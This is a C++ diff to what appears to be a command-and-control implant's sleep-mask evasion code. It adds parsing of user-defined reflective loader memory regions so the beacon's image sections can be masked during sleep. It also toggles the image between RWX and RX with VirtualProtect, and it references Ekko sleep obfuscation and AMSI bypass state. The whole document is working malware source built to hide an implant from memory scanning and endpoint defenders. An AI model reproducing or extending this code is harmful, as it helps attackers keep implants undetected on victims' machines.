@@ -583,12 +583,36 @@ static auto declfn build_sm_beacon_info(
     info.sleep_mask_text_size = sm_compute_coff_text_size();
     info.sleep_mask_total_size = inst.evasion.sleepmask_vs.code_size;
 
+    uintptr_t beacon_base = 0;
+    uint32_t  beacon_size = 0;
+    bool      udrl_valid  = false;
+    uint8_t*  ud          = nullptr;
+
+    if ( inst.evasion.udrl_user_data ) {
+        ud = reinterpret_cast<uint8_t*>( inst.evasion.udrl_user_data );
+        if ( *reinterpret_cast<uint64_t*>( ud ) == 0x5442525354ULL ) {
+            beacon_base = *reinterpret_cast<uintptr_t*>( ud + 0x10 );
+            beacon_size = *reinterpret_cast<uint32_t*>( ud + 0x18 );
+            udrl_valid = true;
+        }
+    }
+
+    if ( !beacon_base || !beacon_size ) {
+        if ( inst.evasion.ekko.initialized ) {
+            beacon_base = inst.evasion.ekko.img_base;
+            beacon_size = inst.evasion.ekko.img_size;
+        } else {
+            beacon_base = inst.base.address;
+            beacon_size = inst.base.length;
+        }
+    }
+
+    info.beacon_ptr = reinterpret_cast<char*>( beacon_base );
+
     if ( inst.evasion.ekko.initialized ) {
-        info.beacon_ptr = reinterpret_cast<char*>( inst.evasion.ekko.img_base );
         for ( int i = 0; i < BOF_MASK_SIZE_SM && i < 16; i++ )
             info.mask[i] = static_cast<char>( inst.evasion.ekko.rc4_key[i] );
     } else {
-        info.beacon_ptr = reinterpret_cast<char*>( inst.base.address );
         ULONG seed = inst.kernel32.GetTickCount();
         for ( int i = 0; i < BOF_MASK_SIZE_SM; i++ ) {
             seed = inst.ntdll.RtlRandomEx( &seed );
@@ -600,26 +624,76 @@ static auto declfn build_sm_beacon_info(
     sentinel.size = 0;
     info.heap_records = &sentinel;
 
-    auto& region = info.allocatedMemory.AllocatedMemoryRegions[0];
-    region.Purpose = 2; /* PURPOSE_BEACON_MEMORY */
-    if ( inst.evasion.ekko.initialized ) {
-        region.AllocationBase = reinterpret_cast<PVOID>( inst.evasion.ekko.img_base );
-        region.RegionSize = inst.evasion.ekko.img_size;
-    } else {
-        region.AllocationBase = reinterpret_cast<PVOID>( inst.base.address );
-        region.RegionSize = inst.base.length;
-    }
-    region.Type = MEM_PRIVATE;
+    if ( udrl_valid ) {
+        //
+        // Parse UDRL_USER_DATA regions (x64 layout, natural alignment)
+        //
+        // UDRL_USER_DATA: regions[8] at +0x48, each UDRL_REGION = 0xA0 bytes
+        //   region_count at +0x48 + 8*0xA0 = +0x548
+        // UDRL_REGION: purpose +0x00, alloc_base +0x08, region_size +0x10,
+        //   sections[4] at +0x18 (each 0x20), section_count at +0x98
+        // UDRL_SECTION: label +0x00, base +0x08, size +0x10, protect +0x18
+        //
+        uint32_t region_count = *reinterpret_cast<uint32_t*>( ud + 0x548 );
+        if ( region_count > 8 ) region_count = 8;
 
-    if ( region.AllocationBase && region.RegionSize > 0 ) {
-        auto& sec = region.Sections[0];
-        sec.Label = 3; /* LABEL_TEXT */
-        sec.BaseAddress = region.AllocationBase;
-        sec.VirtualSize = region.RegionSize;
-        DWORD prot = sm_query_protection( inst, region.AllocationBase );
-        sec.CurrentProtect  = prot;
-        sec.PreviousProtect = prot;
-        sec.MaskSection = TRUE;
+        int sm_idx = 0;
+        for ( uint32_t r = 0; r < region_count && sm_idx < 6; r++ ) {
+            uint8_t* reg = ud + 0x48 + r * 0xA0;
+
+            uint32_t purpose = *reinterpret_cast<uint32_t*>( reg );
+            void*    abase   = *reinterpret_cast<void**>( reg + 0x08 );
+            size_t   rsize   = *reinterpret_cast<size_t*>( reg + 0x10 );
+            uint32_t sec_cnt = *reinterpret_cast<uint32_t*>( reg + 0x98 );
+
+            if ( !abase ) continue;
+
+            auto& sm_reg = info.allocatedMemory.AllocatedMemoryRegions[sm_idx];
+            sm_reg.Purpose        = static_cast<int>( purpose + 2 );
+            sm_reg.AllocationBase = abase;
+            sm_reg.RegionSize     = rsize;
+            sm_reg.Type           = MEM_PRIVATE;
+
+            if ( sec_cnt > 4 ) sec_cnt = 4;
+            for ( uint32_t s = 0; s < sec_cnt; s++ ) {
+                uint8_t* sp = reg + 0x18 + s * 0x20;
+
+                uint32_t label   = *reinterpret_cast<uint32_t*>( sp );
+                void*    sbase   = *reinterpret_cast<void**>( sp + 0x08 );
+                size_t   ssize   = *reinterpret_cast<size_t*>( sp + 0x10 );
+                uint32_t protect = *reinterpret_cast<uint32_t*>( sp + 0x18 );
+
+                int sm_label = ( label <= 1 )
+                    ? static_cast<int>( label )
+                    : static_cast<int>( label + 1 );
+
+                auto& sm_sec = sm_reg.Sections[s];
+                sm_sec.Label           = sm_label;
+                sm_sec.BaseAddress     = sbase;
+                sm_sec.VirtualSize     = ssize;
+                sm_sec.CurrentProtect  = protect ? protect : sm_query_protection( inst, sbase );
+                sm_sec.PreviousProtect = sm_sec.CurrentProtect;
+                sm_sec.MaskSection     = ( purpose == 0 ) ? TRUE : FALSE;
+            }
+            sm_idx++;
+        }
+    } else {
+        auto& region = info.allocatedMemory.AllocatedMemoryRegions[0];
+        region.Purpose = 2;
+        region.AllocationBase = reinterpret_cast<PVOID>( beacon_base );
+        region.RegionSize = beacon_size;
+        region.Type = MEM_PRIVATE;
+
+        if ( region.AllocationBase && region.RegionSize > 0 ) {
+            auto& sec = region.Sections[0];
+            sec.Label = 3;
+            sec.BaseAddress = region.AllocationBase;
+            sec.VirtualSize = region.RegionSize;
+            DWORD prot = sm_query_protection( inst, region.AllocationBase );
+            sec.CurrentProtect  = prot;
+            sec.PreviousProtect = prot;
+            sec.MaskSection = TRUE;
+        }
     }
 }
 
@@ -895,10 +969,20 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
 #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
         sm_veh_state veh_state = {};
 #endif
+        uintptr_t img_base = inst.base.address;
+        uint32_t  img_size = inst.base.length;
+        if ( inst.evasion.udrl_user_data ) {
+            auto ud = reinterpret_cast<uint8_t*>( inst.evasion.udrl_user_data );
+            if ( *reinterpret_cast<uint64_t*>( ud ) == 0x5442525354ULL ) {
+                img_base = *reinterpret_cast<uintptr_t*>( ud + 0x10 );
+                img_size = *reinterpret_cast<uint32_t*>( ud + 0x18 );
+            }
+        }
+
         DWORD pre_prot = 0;
         inst.kernel32.VirtualProtect(
-            reinterpret_cast<PVOID>( inst.base.address ),
-            inst.base.length,
+            reinterpret_cast<PVOID>( img_base ),
+            img_size,
             PAGE_EXECUTE_READWRITE, &pre_prot );
 
         sm_beacon_info info;
@@ -936,8 +1020,8 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
 
         DWORD post_prot = 0;
         inst.kernel32.VirtualProtect(
-            reinterpret_cast<PVOID>( inst.base.address ),
-            inst.base.length,
+            reinterpret_cast<PVOID>( img_base ),
+            img_size,
             PAGE_EXECUTE_READ, &post_prot );
 
         sm_resume_threads( inst );
